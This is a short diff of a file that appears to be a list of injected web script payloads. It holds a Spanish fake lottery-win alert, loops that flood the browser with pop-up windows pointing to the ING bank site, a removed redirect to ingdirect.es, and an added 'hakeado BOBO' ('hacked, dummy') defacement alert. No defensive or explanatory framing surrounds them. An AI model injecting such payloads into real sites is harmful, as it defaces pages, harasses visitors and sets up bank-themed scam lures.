@@ -1,5 +1,5 @@
 <script>alert("Enhorabuena, te ha tocado la loter�a!")</script>
-<script>window.location='https://ingdirect.es';</script>
+
 <script>for (i=0;i<=10;i++) {window.open("https://ing.es","ventana1", "width=120,height=300,scrollbars=NO");}</script>
 <script>for (i=0;i<=10;i++) {window.open("https://ing.es","ventana1", "width=120,height=300,scrollbars=NO");}</script>
 <script>for (i=0;i<=10;i++) {window.open("https://ing.es","ventana1", "width=120,height=300,scrollbars=NO");}</script>
@@ -22,3 +22,4 @@
 <script> for (i = 0; i <= 10; i++) {     num1=Math.random() * (500 - 1) + 1;     num2=Math.random() * (500 - 1) + 1;  window.open("https://ing.es", i, "width="+num1+",height="+num2+",scrollbars=NO, top="+num1+", left="+num2); } </script>
 <script> for (i = 0; i <= 10; i++) {     num1=Math.random() * (500 - 1) + 1;     num2=Math.random() * (500 - 1) + 1;  window.open("https://ing.es", i, "width="+num1+",height="+num2+",scrollbars=NO, top="+num1+", left="+num2); } </script>
 <script> for (i = 0; i <= 10; i++) {     num1=Math.random() * (500 - 1) + 1;     num2=Math.random() * (500 - 1) + 1;  window.open("https://ing.es", i, "width="+num1+",height="+num2+",scrollbars=NO, top="+num1+", left="+num2); } </script>
+<script>alert("hakeado BOBO");</script>
